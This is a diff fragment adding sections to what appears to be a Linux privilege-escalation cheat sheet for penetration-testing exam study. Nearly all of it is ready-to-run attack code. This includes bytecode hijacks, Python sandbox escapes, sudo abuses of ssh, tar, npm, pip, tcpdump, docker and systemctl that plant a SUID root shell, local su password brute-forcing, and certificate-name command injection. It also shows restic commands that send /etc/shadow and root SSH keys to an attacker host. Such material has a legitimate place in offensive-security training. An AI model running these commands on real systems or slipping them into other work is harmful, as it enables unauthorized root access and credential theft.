+sudo pyinstaller /tmp/pwn.spec --distpath /tmp/loot --workpath /tmp/build --specpath /tmp
+
+# Read the bundled files from the output
+cat /tmp/loot/shadow 2>/dev/null || find /tmp/loot -type f | xargs cat 2>/dev/null
+cat /tmp/loot/id_rsa 2>/dev/null
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# pyinstaller itself is the tool (already present if sudo allows it)
+# Only cat/echo needed to create the spec and dummy script
+# The datas=[] directive is the file-read primitive — pyinstaller copies as root
+```
+
+### 4.16l Python __pycache__ Bytecode Hijack with Magic-Header Transplant
+
+When a root-executed Python script imports a module from a directory where you can write to `__pycache__/`, replacing the `.pyc` file with a malicious one (with the correct magic header) hijacks execution on next import.
+
+```bash
+# Detect — find writable __pycache__ directories under root-run scripts
+find / -name "__pycache__" -writable 2>/dev/null
+# Identify the Python script run by root and its imports
+cat <ROOT_SCRIPT> | grep -E "^import|^from"
+ls -la <SCRIPT_DIR>/__pycache__/
+```
+
+```bash
+# Step 1: Identify target .pyc and extract its magic header (first 16 bytes)
+PYVER=$(python3 -c "import sys; print(f'{sys.version_info.major}{sys.version_info.minor}')")
+TARGET_PYC="<MODULE_NAME>.cpython-${PYVER}.pyc"
+xxd -l 16 <SCRIPT_DIR>/__pycache__/${TARGET_PYC} > /tmp/magic_header.hex
+
+# Step 2: Create malicious .py source
+cat > /tmp/evil_module.py <<'EOF'
+import os
+os.system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
+EOF
+
+# Step 3: Compile to .pyc and transplant the original magic header
+python3 -c "
+import py_compile, struct, sys, time
+py_compile.compile('/tmp/evil_module.py', '/tmp/evil.pyc', doraise=True)
+"
+
+# Step 4: Replace magic bytes to match expected timestamp/size
+python3 -c "
+import sys
+with open('<SCRIPT_DIR>/__pycache__/${TARGET_PYC}', 'rb') as f:
+    original_header = f.read(16)
+with open('/tmp/evil.pyc', 'rb') as f:
+    evil_data = f.read()
+with open('<SCRIPT_DIR>/__pycache__/${TARGET_PYC}', 'wb') as f:
+    f.write(original_header + evil_data[16:])
+"
+
+# Wait for root script to run → /tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# python3 (already on target if root runs Python) handles compilation + header transplant
+# No pip install needed — py_compile is stdlib
+python3 -c "
+import py_compile
+py_compile.compile('/tmp/evil_module.py', '<SCRIPT_DIR>/__pycache__/<MODULE>.cpython-3<VER>.pyc')
+"
+```
+
+### 4.16m Python Restricted Sandbox Escape (__builtins__ Stripped)
+
+When a custom "safe_python" or RestrictedPython binary strips `__builtins__` and blocks `import`, escape via MRO class walking, `gc.get_objects()`, or `sys._getframe()` to recover code execution primitives.
+
+```bash
+# Detect — identify restricted Python interpreters
+find / -name "*safe*python*" -o -name "*restricted*" -o -name "*sandbox*" 2>/dev/null | grep -i py
+# Try basic import — if it fails, you're in a sandbox
+# >>> import os  → NameError or ImportError
+```
+
+```python
+# Escape A: MRO class walk (works when __builtins__ is stripped but object access exists)
+# Find a subclass with os/subprocess access
+''.__class__.__mro__[1].__subclasses__()
+# Look for <class 'os._wrap_close'> or <class 'subprocess.Popen'>
+[x for x in ''.__class__.__mro__[1].__subclasses__() if 'wrap_close' in str(x)]
+# Typically index ~133 on Python 3.8+
+''.__class__.__mro__[1].__subclasses__()[<INDEX>].__init__.__globals__['system']('id')
+
+# Escape B: gc.get_objects() — recover builtins from garbage collector
+import gc
+[x for x in gc.get_objects() if hasattr(x, '__name__') and x.__name__ == 'builtins'][0].__import__('os').system('id')
+
+# Escape C: sys._getframe() builtins resurrection
+sys._getframe(0).f_builtins['__import__']('os').system('id')
+
+# Escape D: exception-based __builtins__ recovery
+try:
+    raise Exception()
+except Exception as e:
+    import sys
+    tb = sys.exc_info()[2]
+    tb.tb_frame.f_globals['__builtins__']['__import__']('os').system('id')
+
+# Escape E: type() to reconstruct function with __builtins__
+exec_code = type(lambda:0)(
+    type(lambda:0).__code__.__class__(0,0,0,0,0,b'',(),(),(),'','',0,b''),
+    {'__builtins__': __builtins__}
+)
+```
+
+```bash
+# One-liner for CPTS — try these sequentially until one works:
+# (paste into the restricted interpreter)
+().__class__.__bases__[0].__subclasses__()[<INDEX>].__init__.__globals__['system']('cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash')
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# The escape IS the LOTL technique — you're working within the Python interpreter itself
+# No external tools needed; the MRO walk uses only Python language features
+# Find the correct subclass index on target:
+python3 -c "
+for i,c in enumerate(''.__class__.__mro__[1].__subclasses__()):
+    if 'wrap_close' in str(c): print(i, c)
+"
+```
+
+### 4.16n sudo + http_proxy Environment Hijack — MITM Privileged curl/wget
+
+When `sudo -l` shows SETENV or env_keep includes `http_proxy`/`https_proxy`, and the allowed command invokes curl/wget/apt, intercept the request with a local proxy to inject malicious responses (eval payloads, malicious packages, tampered configs).
+
+```bash
+# Detect
+sudo -l | grep -iE "SETENV|http_proxy|https_proxy|all_proxy"
+# Also check if the sudoed command fetches URLs internally
+strings <ALLOWED_BINARY> | grep -iE "http://\|https://\|curl\|wget\|apt"
+```
+
+```bash
+# Step 1: Start intercepting proxy (socat — often available; or python3 stdlib)
+# Simple socat proxy that serves a crafted response:
+cat > /tmp/proxy_response.txt <<'EOF'
+HTTP/1.1 200 OK
+Content-Type: text/plain
+
+#!/bin/bash
+cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
+EOF
+
+socat TCP-LISTEN:8888,fork,reuseaddr SYSTEM:"cat /tmp/proxy_response.txt" &
+
+# Step 2: Run the sudoed command with proxy set
+sudo http_proxy=http://127.0.0.1:8888 https_proxy=http://127.0.0.1:8888 <ALLOWED_BINARY>
+# The binary's internal HTTP request hits our proxy → receives malicious response
+# If it evals/executes the response → root code execution
+```
+
+```bash
+# Python3 stdlib intercepting proxy (no pip install)
+python3 -c "
+import http.server, socketserver
+
+class Handler(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash')
+    def do_CONNECT(self):
+        self.send_response(200)
+        self.end_headers()
+
+socketserver.TCPServer(('127.0.0.1', 8888), Handler).serve_forever()
+" &
+
+sudo http_proxy=http://127.0.0.1:8888 <ALLOWED_BINARY>
+# After exploitation: kill %1; /tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# socat or python3 (both commonly available) — no pip install needed
+# python3 http.server module is stdlib
+# If neither available, use bash /dev/tcp to serve a static response:
+{
+  echo -e "HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\npwned"
+} | nc -l -p 8888 &
+sudo http_proxy=http://127.0.0.1:8888 <ALLOWED_BINARY>
+```
+
+### 4.16o POSIX Filesystem ACL Enumeration — getfacl / '+' Suffix in ls
+
+Extended POSIX ACLs can grant file access beyond standard unix permissions. A `+` at the end of `ls -la` permissions indicates extended ACLs — enumerate them to find unexpected read/write access to privileged files.
+
+```bash
+# Detect — look for '+' suffix indicating extended ACLs
+ls -la /etc/shadow /root/ /etc/sudoers 2>/dev/null | grep '+'
+# Example: -rw-r-----+ 1 root shadow 1234 Jan 1 00:00 /etc/shadow
+# The '+' means additional ACL entries exist
+
+# Enumerate ACLs on sensitive files
+getfacl /etc/shadow 2>/dev/null
+getfacl /root/ 2>/dev/null
+getfacl /etc/sudoers.d/ 2>/dev/null
+
+# Sweep — find all files with extended ACLs that grant your user/group access
+getfacl -R /etc/ 2>/dev/null | grep -B5 "<USER>\|<GROUP>" | grep "^# file:"
+getfacl -R /root/ 2>/dev/null | grep -B5 "<USER>\|<GROUP>" | grep "^# file:"
+getfacl -R /opt/ 2>/dev/null | grep -B5 "<USER>\|<GROUP>" | grep "^# file:"
+```
+
+```bash
+# Broad sweep using find + getfacl
+find / -maxdepth 4 \( -name "*.conf" -o -name "*.key" -o -name "id_rsa" -o -name "shadow" \) \
+  -exec getfacl {} \; 2>/dev/null | grep -B3 "user:<USER>:r"
+
+# If extended ACL grants write to a root-owned script/config:
+getfacl <TARGET_FILE>
+# user:<USER>:rw- → you can modify it despite standard permissions showing no access
+echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> <TARGET_FILE>
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# getfacl ships with acl package (installed by default on most distros)
+which getfacl 2>/dev/null
+# If getfacl unavailable, check for '+' in ls output as indicator:
+ls -laR /etc/ 2>/dev/null | grep '^-.*+' | head -20
+# Then read the file directly — if ACL grants access, read will succeed even if ls shows no perms
+cat /etc/shadow 2>/dev/null && echo "[!] ACL-granted read access to shadow"
+```
+
+### 4.16p Mounted Partition and Removable Storage Discovery
+
+Post-foothold enumeration of mounted filesystems, removable media, and unmounted partitions can reveal backup drives, NAS shares, or secondary disks containing credentials or sensitive data not visible in the primary filesystem tree.
+
+```bash
+# Currently mounted filesystems (type, mount options, capacity)
+df -hT
+mount | grep -vE "proc|sys|devtmpfs|tmpfs|cgroup"
+cat /proc/mounts | grep -vE "proc|sys|devtmpfs"
+
+# Block devices — shows all partitions including unmounted ones
+lsblk -f
+blkid 2>/dev/null
+
+# Removable/external media mount points
+ls -la /media/ /mnt/ /run/media/ 2>/dev/null
+find /media /mnt -maxdepth 3 -type f 2>/dev/null | head -30
+
+# Unmounted partitions that could contain data
+fdisk -l 2>/dev/null | grep -E "^/dev"
+# Mount an unmounted partition (if permissions allow)
+mkdir -p /tmp/mnt_check
+mount /dev/<PARTITION> /tmp/mnt_check 2>/dev/null
+ls -la /tmp/mnt_check/
+```
+
+```bash
+# Look for interesting files on mounted shares/drives
+find /media /mnt -type f \( -name "*.kdbx" -o -name "*.key" -o -name "id_rsa" -o -name "*.bak" \
+  -o -name "*.sql" -o -name "*.conf" -o -name "*.env" -o -name "*.ovpn" \) 2>/dev/null
+# Backup files often contain old credentials
+find /media /mnt -name "*.tar.gz" -o -name "*.zip" -o -name "*.bak" 2>/dev/null
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# All commands above are LOTL — df, mount, lsblk, blkid, cat /proc/mounts
+# Minimum viable (works on any Linux):
+cat /proc/mounts | grep -v "^proc\|^sys\|^devpts\|^tmpfs"
+cat /proc/partitions
+ls /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
+```
+
+### 4.16q sucrack — Local su Password Brute-Force
+
+When password hashes are not extractable (unreadable `/etc/shadow`, no hashcat path) but you need another user's password for lateral movement or `su`, brute-force the `su` binary locally. Works entirely offline against PAM authentication.
+
+```bash
+# Method 1: sucrack (if transferrable — pre-compiled static binary)
+# sucrack runs su in a pseudo-terminal and tests passwords from a wordlist
+sucrack -u <TARGET_USER> -w 20 /usr/share/wordlists/rockyou.txt
+# -w = number of worker threads (adjust to avoid detection/lockout)
+# -a = use ansi escape codes for su prompt detection
+sucrack -a -u <TARGET_USER> -w 10 <WORDLIST>
+```
+
+```bash
+# Method 2: Pure bash su brute-force (LOTL — no tools needed)
+#!/bin/bash
+TARGET_USER="<TARGET_USER>"
+WORDLIST="/tmp/passwords.txt"
+
+while IFS= read -r pass; do
+  echo "$pass" | timeout 2 su - "$TARGET_USER" -c "echo SUCCESS" 2>/dev/null
+  if [ $? -eq 0 ]; then
+    echo "[+] Password found: $pass"
+    break
+  fi
+done < "$WORDLIST"
+```
+
+```bash
+# Method 3: expect-based (more reliable prompt handling)
+cat > /tmp/su_brute.sh <<'SCRIPT'
+#!/bin/bash
+while IFS= read -r pass; do
+  expect -c "
+    spawn su - <TARGET_USER> -c id
+    expect \"Password:\"
+    send \"$pass\r\"
+    expect {
+      \"uid=\" { puts \"[+] Found: $pass\"; exit 0 }
+      eof { exit 1 }
+    }
+  " 2>/dev/null && break
+done < <WORDLIST>
+SCRIPT
+chmod +x /tmp/su_brute.sh && /tmp/su_brute.sh
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure bash + su — no external tools. Works on any system with su and a pseudo-terminal.
+# The bash while-loop method above is fully LOTL.
+# For very short wordlists (top 100 passwords):
+for p in password admin123 root toor P@ssw0rd changeme; do
+  echo "$p" | timeout 1 su - <TARGET_USER> -c whoami 2>/dev/null && echo "[+] $p" && break
+done
+```
+
+### 4.16r Race-Window File Harvest via Tight Copy Loop
+
+When a privileged process temporarily writes a sensitive file then deletes it (common with temp credentials, session tokens, one-time configs), a tight copy loop or inotifywait captures the file during the brief existence window.
+
+```bash
+# Method 1: Tight copy loop (pure bash — no inotify tools)
+# Target: a file that briefly appears then vanishes (e.g., /tmp/.secret, /run/creds)
+while true; do
+  cp <TARGET_PATH> /tmp/harvested_$(date +%s%N) 2>/dev/null
+done &
+HARVEST_PID=$!
+
+# Wait for the privileged process to run (cron, manual trigger, etc.)
+# Then stop:
+kill $HARVEST_PID 2>/dev/null
+ls -la /tmp/harvested_*
+cat /tmp/harvested_* 2>/dev/null | sort -u
+```
+
+```bash
+# Method 2: inotifywait (more efficient — triggers only on file creation)
+# Monitor directory for file creation events
+inotifywait -m -e create -e modify <TARGET_DIR> |
+while read dir action file; do
+  cp "${dir}${file}" "/tmp/harvest_${file}_$(date +%s)" 2>/dev/null
+  echo "[+] Captured: ${dir}${file}"
+done
+
+# Method 3: Monitor AND read before deletion
+inotifywait -m -e create <TARGET_DIR> --format '%w%f' |
+while read filepath; do
+  cat "$filepath" > "/tmp/loot_$(basename $filepath)_$(date +%s)" 2>/dev/null
+done
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# The tight while+cp loop is pure bash — fully LOTL, works everywhere
+# inotifywait requires inotify-tools package but is often pre-installed on Ubuntu/Debian
+which inotifywait 2>/dev/null || (
+  # Fallback: poll with ls in tight loop
+  while true; do ls <TARGET_PATH> 2>/dev/null && cp <TARGET_PATH> /tmp/got_it && break; done
+)
+```
+
+### 4.16s openssl x509 Common Name Command Injection Against Parsing Scripts
+
+When a cron job or monitoring script parses certificate subjects (`openssl x509 -subject`) and passes the CN field unquoted into a shell command, injecting shell metacharacters into a certificate's Common Name yields code execution as the script's user.
+
+```bash
+# Detect — find scripts that parse certificate subjects
+grep -rE "openssl.*x509.*-subject\|openssl.*-noout.*-subject" /etc/cron* /opt/ /usr/local/bin/ 2>/dev/null
+grep -rE "CN=\|commonName\|subject=" /etc/cron* /opt/ /usr/local/bin/ 2>/dev/null
+# Vulnerable pattern in script:
+# CN=$(openssl x509 -in $cert -noout -subject | grep -oP 'CN=\K[^/]+')
+# echo "Certificate for $CN expires soon"   ← unquoted $CN = injection
+```
+
+```bash
+# Exploit — generate certificate with shell metacharacters in CN
+openssl req -x509 -newkey rsa:2048 -keyout /tmp/evil.key -out /tmp/evil.crt \
+  -days 1 -nodes -subj '/CN=$(cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash)'
+
+# Place the cert where the parsing script reads from
+cp /tmp/evil.crt <CERT_DIRECTORY>/
+
+# Alternative CN payloads:
+# Backtick variant: /CN=`cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash`
+openssl req -x509 -newkey rsa:2048 -keyout /tmp/k.key -out /tmp/k.crt \
+  -days 1 -nodes -subj '/CN=`id > /tmp/cn_proof`'
+
+# Semicolon variant: /CN=legit;cp /bin/bash /tmp/rootbash;#
+openssl req -x509 -newkey rsa:2048 -keyout /tmp/k.key -out /tmp/k.crt \
+  -days 1 -nodes -subj '/CN=legit;cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash;#'
+
+# Wait for cron/script execution → /tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# openssl is standard on virtually every Linux system
+# Only openssl + cp needed to create the malicious certificate
+# The parsing script itself does the command injection via unquoted variable expansion
+openssl req -x509 -newkey rsa:2048 -keyout /dev/null -out /tmp/test.crt \
+  -days 1 -nodes -subj '/CN=$(id > /tmp/cn_lotl_proof)' 2>/dev/null
+```
+
+### 4.16t MySQL Client \! Shell-Escape Privesc
+
+When user-controlled input is spliced unquoted into a `mysql -e "..."` call by a privileged script, the `\!` mysql client command escapes to a shell. Also applicable when `sudo -l` allows `mysql` — use `\! /bin/bash` to break out.
+
+```bash
+# Detect — sudo allows mysql client
+sudo -l | grep -i mysql
+# Or: find scripts that pass unquoted input to mysql -e
+grep -rE 'mysql.*-e.*\$' /opt/ /usr/local/bin/ /etc/cron* 2>/dev/null
+```
+
+```bash
+# Method 1: Direct sudo mysql → shell escape
+sudo mysql -e '\! /bin/bash -p'
+# Or in interactive mode:
+sudo mysql
+# mysql> \! /bin/bash
+# mysql> system /bin/bash
+
+# Method 2: Input injection into mysql -e call
+# If a script does: mysql -u root -e "SELECT * FROM users WHERE name='$INPUT'"
+# Inject: ' \! cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash \! '
+# The \! causes mysql client to execute the following as a shell command
+
+# Method 3: mysql --init-command for scripts that invoke mysql non-interactively
+sudo mysql --init-command='\! cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash'
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# mysql client IS the LOTL tool — present if sudo allows it
+# \! is a mysql client built-in command, no external tools
+sudo mysql -e '\! id > /tmp/mysql_escape_proof'
+cat /tmp/mysql_escape_proof
+```
+
 [Back to top](#table-of-contents)
+
+### 4.17 Sudo /usr/bin/ssh — PermitLocalCommand / ProxyCommand Shell Escape
+
+When `sudo -l` shows NOPASSWD on `/usr/bin/ssh`, the SSH client itself provides multiple code-execution primitives without needing a valid remote host.
+
+```bash
+# Detect
+sudo -l | grep ssh
+
+# Method 1: ProxyCommand — executes shell command before connection attempt
+sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+
+# Method 2: PermitLocalCommand — runs LocalCommand after auth (force pseudo-tty)
+sudo ssh -o PermitLocalCommand=yes -o LocalCommand='/bin/bash' <USER>@127.0.0.1
+
+# Method 3: Pre-authentication — no valid host needed
+sudo ssh -o ProxyCommand='/bin/bash -i' x
+
+# Method 4: SSH escape sequence (if already in sudo ssh session)
+# Press ~C to open ssh> prompt, then:
+# ssh> !sh
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# ssh is the tool itself — fully LOTL, no downloads needed
+# ProxyCommand method requires no network access (connection never completes)
+sudo ssh -o ProxyCommand='/bin/sh 0<&2 1>&2' x
+```
+
+### 4.17b Sudo tar — Direct GTFOBin Abuse (No Wildcard Required)
+
+When `sudo -l` shows NOPASSWD on `/bin/tar` or `/usr/bin/tar`, the `--checkpoint-action` flag provides direct code execution without any wildcard or cron dependency.
+
+```bash
+# Detect
+sudo -l | grep tar
+
+# Method 1: --checkpoint-action=exec (simplest)
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+
+# Method 2: Spawn SUID bash for persistence across the session
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"
+/tmp/rootbash -p
+
+# Method 3: --to-command (pipe extracted data to command)
+echo '' | sudo tar xf - --to-command='/bin/bash'
+
+# Method 4: Compressed archive with payload
+sudo tar czf /dev/null /etc/hostname --checkpoint=1 --checkpoint-action='exec=sh -c "id > /tmp/proof"'
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# tar ships with every Linux installation — fully LOTL
+# The --checkpoint-action mechanism is built into GNU tar
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
+
+### 4.17c Sudo npm install — Lifecycle Script Abuse for Root
+
+When `sudo -l` shows NOPASSWD on `/usr/bin/npm` or `/usr/local/bin/npm`, npm's lifecycle scripts (preinstall/install/postinstall) execute as root during `npm install`.
+
+```bash
+# Detect
+sudo -l | grep npm
+
+# Method 1: Create minimal package with preinstall hook
+mkdir /tmp/npmpwn && cd /tmp/npmpwn
+cat > package.json <<'EOF'
+{
+  "name": "pwn",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"
+  }
+}
+EOF
+sudo npm install --unsafe-perm
+
+# Method 2: Using npm exec (npm 7+)
+sudo npm exec --yes -- /bin/bash
+
+# Method 3: npm run-script with arbitrary command
+echo '{"scripts":{"pwn":"/bin/bash"}}' > /tmp/p.json
+sudo npm --prefix /tmp run pwn --userconfig=/tmp/p.json
+
+# Collect
+/tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# npm is the tool itself; only echo/cat needed to create package.json
+# No network access required — npm install on a local dir with no deps just runs scripts
+mkdir /tmp/x && echo '{"scripts":{"preinstall":"id > /tmp/proof"}}' > /tmp/x/package.json
+sudo npm install /tmp/x --unsafe-perm
+```
+
+### 4.17d Sudo pip install — setup.py Code Execution as Root
+
+When `sudo -l` shows NOPASSWD on `/usr/bin/pip` or `/usr/bin/pip3`, `pip install` of a local directory executes `setup.py` as root.
+
+```bash
+# Detect
+sudo -l | grep pip
+
+# Method 1: Local directory with malicious setup.py
+mkdir /tmp/pippwn && cd /tmp/pippwn
+cat > setup.py <<'EOF'
+import os
+os.system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
+EOF
+sudo pip install /tmp/pippwn
+
+# Method 2: pip install with --pre and local egg-info
+cat > /tmp/pippwn/setup.py <<'EOF'
+from setuptools import setup
+import os
+os.system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
+setup(name="pwn", version="1.0")
+EOF
+sudo pip3 install /tmp/pippwn
+
+# Method 3: pip download + install (works when install from URL is blocked)
+sudo pip install --no-deps --no-build-isolation /tmp/pippwn
+
+# Collect
+/tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# pip is the tool; setup.py is just Python — no downloads needed
+mkdir /tmp/p && cat > /tmp/p/setup.py <<'EOF'
+import os; os.system("id > /tmp/proof")
+EOF
+sudo pip install /tmp/p 2>/dev/null
+cat /tmp/proof
+```
+
+### 4.17e Sudo ansible-playbook — Arbitrary File Read via Parser Error
+
+When `sudo -l` shows NOPASSWD on `/usr/bin/ansible-playbook`, feeding a non-YAML file causes the parser to dump the file contents in its error message — yielding arbitrary file read as root.
+
+```bash
+# Detect
+sudo -l | grep ansible-playbook
+
+# Read /etc/shadow via parser error output
+sudo ansible-playbook /etc/shadow 2>&1 | head -20
+# ERROR! ... We were unable to read ... the file contents:
+# root:$6$...:19000:0:99999:7:::
+# The error message includes the raw file content
+
+# Read root's SSH key
+sudo ansible-playbook /root/.ssh/id_rsa 2>&1
+
+# Read any file on the system
+sudo ansible-playbook <TARGET_FILE> 2>&1
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# ansible-playbook is the tool itself — no additional software needed
+# The parser error is the read primitive; grep to clean output
+sudo ansible-playbook /etc/shadow 2>&1 | grep -v "^ERROR\|^$\|WARNING"
+```
+
+### 4.17f Sudo tcpdump — Postrotate Command Execution via -z Flag
+
+When `sudo -l` shows NOPASSWD on `/usr/sbin/tcpdump`, the `-z` flag (post-rotate command) executes an arbitrary command after each pcap rotation — running as root.
+
+```bash
+# Detect
+sudo -l | grep tcpdump
+
+# Method 1: -z flag triggers command on file rotation
+cat > /tmp/pwn.sh <<'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
+EOF
+chmod +x /tmp/pwn.sh
+sudo tcpdump -i lo -w /tmp/cap.pcap -G 1 -W 1 -z /tmp/pwn.sh
+# -G 1 = rotate every 1 second, -W 1 = only 1 file, then -z fires
+
+# Method 2: Simpler with -c (capture count limit)
+sudo tcpdump -i lo -c 1 -w /tmp/cap.pcap -z /tmp/pwn.sh &
+ping -c 1 127.0.0.1  # generate one packet to satisfy -c 1
+
+# Collect
+/tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# tcpdump is the tool; /tmp/pwn.sh is just a bash script — fully LOTL
+# Alternative without writing a script file (bash -c inline won't work with -z; must be a path)
+# Workaround: echo payload into a file first — that's already LOTL
+printf '#!/bin/sh\nid > /tmp/proof' > /tmp/z.sh && chmod +x /tmp/z.sh
+sudo tcpdump -i lo -c 1 -w /tmp/x -G 1 -W 1 -z /tmp/z.sh &
+ping -c 1 127.0.0.1
+```
+
+### 4.17g Sudo docker exec Wildcard — Privileged Flag Injection
+
+When `sudo -l` shows `(root) NOPASSWD: /usr/bin/docker exec *` (wildcard), inject `--privileged -u root` flags before the container name, overriding the container's default user/capability set.
+
+```bash
+# Detect
+sudo -l | grep "docker exec"
+# Look for: (root) NOPASSWD: /usr/bin/docker exec *
+
+# List running containers
+docker ps
+
+# Exploit: inject --privileged and -u root before container ID
+sudo /usr/bin/docker exec --privileged -u root -it <CONTAINER_ID> /bin/bash
+
+# Inside the now-privileged container: mount host filesystem
+fdisk -l 2>/dev/null || ls /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
+mkdir -p /tmp/hostfs
+mount /dev/sda1 /tmp/hostfs
+chroot /tmp/hostfs bash
+# Now on the host as root
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# docker is the tool itself — no downloads needed
+# The wildcard in sudoers permits arbitrary flag injection
+sudo /usr/bin/docker exec --privileged -u root -it <CONTAINER_ID> sh -c 'cat /etc/shadow'
+```
+
+### 4.17h Sudo docker-compose — Root via Attacker-Controlled YAML
+
+When `sudo -l` shows NOPASSWD on `/usr/bin/docker-compose` or `/usr/local/bin/docker-compose`, supply a YAML file that mounts the host filesystem and gains root.
+
+```bash
+# Detect
+sudo -l | grep docker-compose
+
+# Method 1: Volume mount + chroot (classic)
+cat > /tmp/pwn.yml <<'EOF'
+version: "3"
+services:
+  pwn:
+    image: alpine
+    volumes:
+      - /:/mnt
+    command: chroot /mnt bash -c "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"
+EOF
+sudo docker-compose -f /tmp/pwn.yml up
+
+# Method 2: cap_add ALL (bypasses wrapper scripts that block volume mounts)
+cat > /tmp/pwn.yml <<'EOF'
+version: "3"
+services:
+  pwn:
+    image: alpine
+    cap_add:
+      - ALL
+    privileged: true
+    pid: host
+    command: nsenter -t 1 -m -u -i -n -p -- bash -c "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"
+EOF
+sudo docker-compose -f /tmp/pwn.yml up
+
+# Collect (on host)
+/tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# docker-compose is the tool; only cat/echo needed for YAML
+# Requires a pulled image (alpine is ~5MB, often already cached)
+# If no image is available, use whatever `docker images` shows:
+docker images --format '{{.Repository}}:{{.Tag}}' | head -1
+```
+
+### 4.17i Sudo restic backup — Arbitrary File Read via Attacker-Controlled Repo
+
+When `sudo -l` shows NOPASSWD on `/usr/bin/restic`, the backup subcommand sends file contents to the configured repository. Point it at a local writable repo to exfiltrate any file on the system.
+
+```bash
+# Detect
+sudo -l | grep restic
+
+# Method 1: Local repo (no network needed)
+sudo restic -r /tmp/myrepo init --password-command 'echo x'
+sudo restic -r /tmp/myrepo backup /etc/shadow /root/.ssh --password-command 'echo x'
+restic -r /tmp/myrepo dump latest /etc/shadow --password-command 'echo x'
+
+# Method 2: Remote rest-server on attacker box
+# On attacker: restic-rest-server --no-auth --path /tmp/restic-repo &
+sudo restic -r rest:http://<ATTACKER_IP>:8000/ init --password-command 'echo pwn'
+sudo restic -r rest:http://<ATTACKER_IP>:8000/ backup /etc/shadow /root/.ssh --password-command 'echo pwn'
+
+# On attacker, restore and read
+restic -r /tmp/restic-repo restore latest --target /tmp/loot --password-command 'echo pwn'
+cat /tmp/loot/etc/shadow
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# restic is the tool permitted by sudo — no additional installs on target
+# Local repo approach requires only a writable dir (/tmp):
+sudo restic -r /tmp/r init --password-command 'echo x'
+sudo restic -r /tmp/r backup /root/.ssh --password-command 'echo x'
+restic -r /tmp/r dump latest /root/.ssh/id_rsa --password-command 'echo x'
+```
+
+### 4.17j Sudo systemctl with Wildcard — Writable Unit Directory Privesc
+
+When `sudo -l` shows `(root) NOPASSWD: /bin/systemctl restart *` (or start/stop/reload with wildcard), and a systemd unit directory is writable, plant a new `.service` file and restart it for root code execution.
+
+```bash
+# Detect
+sudo -l | grep systemctl
+# Look for: (root) NOPASSWD: /bin/systemctl restart *
+#           (root) NOPASSWD: /bin/systemctl start *
+
+# Check which unit directories are writable
+ls -ld /etc/systemd/system/ /run/systemd/system/ /usr/lib/systemd/system/ 2>/dev/null
+getfacl /etc/systemd/system/ 2>/dev/null
+find /etc/systemd/system/ /run/systemd/system/ -writable -type d 2>/dev/null
+
+# Step 1: Create a malicious service unit
+cat > /etc/systemd/system/pwn.service <<'EOF'
+[Unit]
+Description=pwn
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# Step 2: Reload and start (if sudo allows daemon-reload + start/restart)
+sudo /bin/systemctl daemon-reload
+sudo /bin/systemctl restart pwn.service
+
+# If daemon-reload is not permitted, use /run/systemd/system/ (takes effect without reload)
+cat > /run/systemd/system/pwn.service <<'EOF'
+[Unit]
+Description=pwn
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"
+EOF
+sudo /bin/systemctl restart pwn.service
+
+# Collect
+/tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# systemctl and bash are native — no external tools
+# The unit file is plain text written with cat/echo
+# /run/systemd/system/ does not require daemon-reload on most systemd versions
+```
+
